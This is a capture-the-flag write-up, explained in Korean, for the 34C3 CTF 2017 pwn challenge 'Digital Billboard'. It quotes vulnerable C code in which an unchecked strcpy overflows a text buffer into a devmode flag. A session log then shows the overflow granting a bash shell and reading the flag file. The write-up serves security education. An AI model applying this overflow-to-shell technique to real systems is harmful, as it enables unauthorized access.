# [2017_34C3CTF] \[PWN] Digital Billboard

## Description

```
We bought a new Digital Billboard for CTF advertisement:

nc 35.198.185.193 1337
```

## Solution

```c
void set_text(int argc, char* argv[]) {
    strcpy(bb.text, argv[1]);
    printf("Successfully set text to: %s\n", bb.text);
    return;
}

void shell(int argc, char* argv[]) {
    if (bb.devmode) {
        printf("Developer access to billboard granted.\n");
        system("/bin/bash");
    } else {
        printf("Developer mode disabled!\n");
    }
    return;
}
```

`billboard.c`를 보면 `/bin/bash`를 실행시켜주는 함수가 있습니다. 개발자 모드가 켜져있으면 이를 실행시키는데, `set_text` 함수의 `strcpy`를 통해 버퍼오버플로우를 발생시키면 개발자 모드를 켤 수 있습니다.

```c
struct billboard {
    char text[256];
    char devmode;
};
```

256 바이트를 초과시키는 값을 넣으면 `devmode`가 켜집니다.

## Exploit

```
*
* Digital Billboard
*
We bought a new digital billboard for CTF advertisement.

Type "help" for help :)
> set_text aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Successfully set text to: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
> devmode 
Developer access to billboard granted.
cat flag.txt
34C3_w3lc0me_t0_34c3_ctf_H4ve_fuN
```

